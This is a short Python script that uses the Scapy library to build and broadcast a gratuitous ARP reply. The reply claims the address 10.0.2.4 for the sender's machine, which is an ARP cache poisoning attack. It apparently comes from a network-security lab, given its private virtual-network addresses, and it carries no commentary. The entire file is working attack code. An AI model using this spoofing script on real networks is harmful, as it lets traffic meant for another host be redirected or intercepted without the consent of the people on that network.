#!/usr/bin/env python
from scapy.all import *

ether = Ether()
ether.dst = 'ff:ff:ff:ff:ff:ff'
arp = ARP()
arp.op = 2
arp.psrc = '10.0.2.4'
arp.pdst = '10.0.2.4'
arp.hwdst = 'ff:ff:ff:ff:ff:ff'

pkt = ether/arp
sendp(pkt)

pkt.show()
